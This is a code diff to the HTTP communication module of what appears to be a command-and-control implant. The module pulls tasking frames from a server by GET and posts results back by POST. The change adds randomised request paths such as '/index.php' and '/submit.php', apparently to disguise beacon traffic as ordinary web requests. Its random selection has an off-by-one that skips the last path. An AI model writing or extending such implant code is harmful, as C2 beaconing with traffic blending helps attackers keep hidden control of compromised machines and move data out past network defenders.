@@ -32,7 +32,7 @@ public class HttpCommModule : EgressCommModule
     {
         try
         {
-            var response = await _client.GetByteArrayAsync("/");
+            var response = await _client.GetByteArrayAsync(GetRandomPath(Verb.GET));
             return response.Deserialize<IEnumerable<C2Frame>>();
         }
         catch
@@ -47,7 +47,7 @@ public class HttpCommModule : EgressCommModule
 
         try
         {
-            await _client.PostAsync("/", content);
+            await _client.PostAsync(GetRandomPath(Verb.POST), content);
         }
         catch
         {
@@ -60,7 +60,31 @@ public class HttpCommModule : EgressCommModule
         return true;
     }
 
+    private static string GetRandomPath(Verb verb)
+    {
+        var paths = verb switch
+        {
+            Verb.GET => GetPaths.Split(';'),
+            Verb.POST => PostPaths.Split(';'),
+            
+            _ => throw new ArgumentOutOfRangeException(nameof(verb), verb, null)
+        };
+
+        var rand = new Random();
+        var index = rand.Next(0, paths.Length - 1);
+
+        return paths[index];
+    }
+
+    private enum Verb
+    {
+        GET,
+        POST
+    }
+
     private static string Schema => "http";
     private static string ConnectAddress => "localhost";
     private static string ConnectPort => "8080";
+    private static string GetPaths => "/index.php";
+    private static string PostPaths => "/submit.php";
 }
